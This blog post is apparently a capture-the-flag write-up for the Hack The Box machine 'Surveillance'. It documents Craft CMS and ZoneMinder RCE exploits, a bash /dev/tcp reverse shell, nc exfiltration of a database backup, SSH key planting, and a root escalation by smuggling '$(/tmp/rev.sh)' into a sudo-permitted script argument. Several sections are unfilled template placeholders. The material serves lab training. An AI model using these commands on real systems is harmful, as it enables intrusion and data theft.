---
title: "Surveillance"
excerpt: "Writeup retired machine Surveillance"
seo_title: "Writeup retired machine Surveillance"
date: 2023-12-09
categories: 
- post
tags: 
- HTB
- Linux
---

# **HTB Machine: Surveillance**

![Untitled](\assets\images\HTB\Surveillance.png)

## **Enumeration**

### port scan

80,443:

```bash
nmap -sC -sV 10.129.46.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-10 09:21 EST
Nmap scan report for surveillance.htb (10.129.46.147)
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance 
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.52 seconds
```

### **Services**

- [List of services and their versions]

## **Initial Access**

- **Method Used:** [e.g., nmap, web browser, etc.]
- **Details:** [Brief description of the initial access point]

Need to add hosts:

```bash
10.129.46.147 surveillance.htb
```

is a security research blog:

![Untitled](\assets\images\HTB\Surveillance 1.png)

### Subdomain scanning

Subdomain name scan didint found any subs:

```bash
ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "https://app.napper.htb/" -H 'Host: FUZZ.napper.htb' -fs 5602

[Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 92ms] 
   
```

observe thet use craft CMS [https://github.com/craftcms/cms/tree/4.4.14](https://github.com/craftcms/cms/tree/4.4.14)

![Untitled](\assets\images\HTB\Surveillance 2.png)

## **User Flag**

- **Location:** [Path to the user flag]
- **Method:** [Details on how you obtained user-level access]
- **Challenges Faced:** [Any difficulties or interesting findings]

which vernable to RCE with [**CVE-2023-41892**](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)

[https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce)

we got the rce but not stable lets edit the poc from `no value` to `<i>no value</i>`

```bash
python3 cvehtb.py http://surveillance.htb/
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

so after stable the shell

```bash
└─# python3 cvehtb.py http://surveillance.htb/
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash -c 'bash -i >& /dev/tcp/10.10.14.76/1122 0>&1'&
```

and then we got the backup from the web path and send it to our local via:

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -nlvp 1122                    
listening on [any] 1122 ...
connect to [10.10.14.76] from (UNKNOWN) [10.129.46.147] 40694
bash: cannot set terminal process group (974): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$ cd ..//storage/backups
cd ..//storage/backups
www-data@surveillance:~/html/craft/storage/backups$ ls
ls
surveillance--2023-10-17-202801--v4.4.14.sql.zip
www-data@surveillance:~/html/craft/storage/backups$ nc -w 3 10.10.14.76 1234 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
< < surveillance--2023-10-17-202801--v4.4.14.sql.zip
www-data@surveillance:~/html/craft/storage/backups$
```

in local 

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nc -l -p 1234 > surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

we found in the .sql file the hash of mathew user password

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip 
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Downloads]
└─# grep -oE '\b[0-9a-fA-F]{64}\b' surveillance--2023-10-17-202801--v4.4.14.sql
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
```

```bash
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

we got the ssh rn via 

```bash
sshpass -p 'starcraft122490' /bin/ssh matthew@surveillance.htb
```

## **Privilege Escalation**

- **Method Used:** [e.g., kernel exploit, misconfigurations, etc.]
- **Details:** [Description of the privilege escalation process]
- **Challenges Faced:** [Any difficulties encountered during privilege escalation]

after basics enum there is another local web app in 8080 

```bash
matthew@surveillance:~$ cat  /etc/nginx/sites-enabled/zoneminder.conf
server {
    listen 127.0.0.1:8080;
    
    root /usr/share/zoneminder/www;
    
    index index.php;
    
    access_log /var/log/zm/access.log;
    error_log /var/log/zm/error.log;
    
    location / {
        try_files $uri $uri/ /index.php?$args =404;
       
        location ~ /api/(css|img|ico) {
            rewrite ^/api(.+)$ /api/app/webroot/$1 break;
            try_files $uri $uri/ =404;
        }

        location /api {
            rewrite ^/api(.+)$ /api/app/webroot/index.php?p=$1 last;
        }

        location /cgi-bin {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_pass unix:/run/fcgiwrap.sock;
        }
        
        location ~ \.php$ {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_index index.php;
            
            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock;
        }
    }
}
matthew@surveillance:~$
```

so lets reverse that port via chisel or just 

```bash
ssh -L 8090:127.0.0.1:8080 matthew@surveillance.htb
```

and there is another user called zoneminder  so lets privesc after we got the user flag

![Untitled](\assets\images\HTB\Surveillance 3.png)

so the [ZoneMinder](http://127.0.0.1:8090/#) vulnerable with command injection via **CVE-2023-26035**

and this poc work [https://sploitus.com/exploit?id=1337DAY-ID-39149&utm_source=rss&utm_medium=rss](https://sploitus.com/exploit?id=1337DAY-ID-39149&utm_source=rss&utm_medium=rss) but we need to confugure it as msf

so lets write the exploit in .rb file and move it to 

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ll /usr/share/metasploit-framework/modules/exploits/exp.rb     
-rw-r--r-- 1 root root 4083 Dec  9 16:39 /usr/share/metasploit-framework/modules/exploits/exp.rb
```

and 

```bash
msf6 > use exploit/exp
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(exp) > set lhost 10.10.14.76
lhost => 10.10.14.76
msf6 exploit(exp) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(exp) > set RPORT 8090
RPORT => 8090
msf6 exploit(exp) > set targeturi /
targeturi => /
msf6 exploit(exp) > exploit

[*] Started reverse TCP handler on 10.10.14.76:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Elapsed time: 12.717124683000293 seconds.
[+] The target is vulnerable.
[*] Fetching CSRF Token
[+] Got Token: key:82c688f15ac9d816edfd38266ab83696c4e70655,1702220115
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045380 bytes) to 10.129.46.147
[*] Meterpreter session 1 opened (10.10.14.76:4444 -> 10.129.46.147:40088) at 2023-12-10 09:55:32 -0500
[+] Payload sent

meterpreter > shell
Process 1867 created.
Channel 1 created.
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```

and after we get another stable shell

```bash
zoneminder@surveillance:~$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/zoneminder/.ssh/id_rsa): 
Created directory '/home/zoneminder/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/zoneminder/.ssh/id_rsa
Your public key has been saved in /home/zoneminder/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:MJmFIGEdOcEZ2W7/WhwQguJAb3+32QzodrA4D/Yg0AE zoneminder@surveillance
The key's randomart image is:
+---[RSA 3072]----+
|.E++=@..o        |
|..+.O o= .       |
| o = o= .        |
|  + o oo..       |
| . . o =So.      |
|  .   + =.*.     |
|   . * + =oo     |
|    o B ...      |
|       o..       |
+----[SHA256]-----+
zoneminder@surveillance:~$ cd .ssh      
cd .ssh
zoneminder@surveillance:~/.ssh$ ls -la
ls -la
total 16
drwx------ 2 zoneminder zoneminder 4096 Dec 10 14:56 .
drwxr-x--- 3 zoneminder zoneminder 4096 Dec 10 14:56 ..
-rw------- 1 zoneminder zoneminder 2610 Dec 10 14:56 id_rsa
-rw-r--r-- 1 zoneminder zoneminder  577 Dec 10 14:56 id_rsa.pub
zoneminder@surveillance:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpeitb+1XC3+usZCe3e3880Q4vlN4LfgNF7f7KVx5J5CwJetFSmISKtzMGIp/pu0qyxIs1RPqqfSOtjW58nmiTFBxl1T5bMMNDFoGdCnThKIPuPOZB2oA3VYIoHdXXUPi8BnGiThl1fHjCQcq4Ezxr6i0DZsSV1Wypan19xPKs3x0R/wq9DhFmdda9P28grcBdEXOuvtkUz7YLWmwG0NN/ff+PSQLkhXwNhzWMwN09vySW3Xn5vJI34zc45V6ezg3XPeTo0/P94tSdOV7Ny9swjUz+8z9K/F0oVJBY8V+A15JyiKFYkqE2Z/B8heZOPHRise8ImrQfHdkxIumRKqapIQmzeS3JPVuS3aD900RquzsC6hKjK5k1ch5/BHNBjF8jqasBImZHDzOefIs9iB6ExVHz6XujBv+p072sUgc7NpkKnC4+kxNvu3YsNp3TEWH35cfYO4ieYPlBoOjXHQCEIBxwvmRGSLtS4TgOvdmI6U/l8I7UUkdTi6bH/wAlUuc= root@kali" > authorized_keys
</l8I7UUkdTi6bH/wAlUuc= root@kali" > authorized_keys
zoneminder@surveillance:~/.ssh$
```

and connect via key as zoneminder 

```bash
┌──(root㉿kali)-[~]
└─# ssh zoneminder@surveillance.htb                                                                              
The authenticity of host 'surveillance.htb (10.129.46.147)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 10 02:58:18 PM UTC 2023

  System load:  0.08642578125     Processes:             229
  Usage of /:   84.2% of 5.91GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 10.129.46.147
  Swap usage:   0%

  => There is 1 zombie process.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zoneminder@surveillance:~$
```

the first enum give us

```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
zoneminder@surveillance:~$
```

so the root should be one of that files

```bash
zoneminder@surveillance:~$ ll /usr/bin/zm*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl*
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl*
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl*
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl*
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl*
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl*
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl*
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl*
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl*
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl*
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl*
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl*
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl*
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl*
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl*
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl*
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl*
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl*
zoneminder@surveillance:
```

## **Root Flag**

- **Location:** [Path to the root flag]
- **Method:** [Details on how you achieved root-level access]
- **Challenges Faced:** [Any difficulties or interesting findings]

and after a lot of documentation and testing thos file 

```bash
zoneminder@surveillance:~$ echo "/bin/bash -p" > /tmp/rev.sh
zoneminder@surveillance:~$ chmod +x /tmp/rev.sh
zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword202

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : 
Please press 'y' for a backup or 'n' to continue only : 
Please press 'y' for a backup or 'n' to continue only : n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
root@surveillance:/home/zoneminder#
```

## **Lessons Learned**

- [Reflect on what you learned during the machine]
- [Mistakes made and how to avoid them in the future]
- [New tools or techniques discovered]

## **Resources**

- [List of tools, scripts, or write-ups used]
- [References to any helpful documentation or articles]

## **Acknowledgments**

- [Credit to fellow HTB members or external resources that helped]
- [Any shoutouts or thanks]